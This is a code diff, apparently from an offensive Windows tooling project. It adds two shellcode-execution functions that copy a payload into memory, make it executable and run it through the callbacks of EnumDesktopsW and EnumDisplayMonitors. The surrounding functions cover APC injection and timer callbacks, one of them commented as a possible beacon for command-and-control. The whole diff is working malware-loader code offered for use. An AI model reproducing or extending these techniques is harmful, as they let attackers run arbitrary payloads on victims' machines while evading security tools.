@@ -26,7 +26,6 @@ BOOLEAN APCPayloadInjection
 	return TRUE;
 }
 
-
 BOOLEAN InjectCallbackPayloadEnumChildWindows
 (
 	IN     LPVOID  pPayload,
@@ -51,6 +50,31 @@ BOOLEAN InjectCallbackPayloadEnumChildWindows
 
 		return TRUE;
 }
+BOOLEAN InjectCallbackPayloadEnumDesktops
+(
+	IN     LPVOID  pPayload,
+	IN     DWORD   sPayloadSize,
+	   OUT PDWORD  pdwOldProtections,
+	   OUT PVOID * pInjectedPayloadAddress
+)
+{
+	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
+
+	PUCHAR pLocalPayload = NULL;
+
+	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+
+	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
+
+	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;
+
+	EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)pLocalPayload, NULL);
+
+	*pInjectedPayloadAddress = pLocalPayload;
+
+	return TRUE;
+}
+
 
 BOOLEAN InjectCallbackPayloadEnumFonts
 (
@@ -158,6 +182,32 @@ BOOLEAN InjectCallbackPayloadTimer //Possible beacon function 4 C2
 	
 	return TRUE;
 }
+
+BOOLEAN InjectCallbackPayloadEnumDisplayMonitors
+(
+	IN     LPVOID  pPayload,
+	IN     DWORD   sPayloadSize,
+	   OUT PDWORD  pdwOldProtections,
+	   OUT PVOID  *pInjectedPayloadAddress
+)
+{
+	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
+
+	PUCHAR pLocalPayload = NULL;
+
+	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+
+	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
+
+	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;
+
+	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)pLocalPayload, NULL);
+
+	*pInjectedPayloadAddress = pLocalPayload;
+
+	return TRUE;
+}
+
 
 BOOLEAN InjectCallbackPayloadVerEnumResource
 (
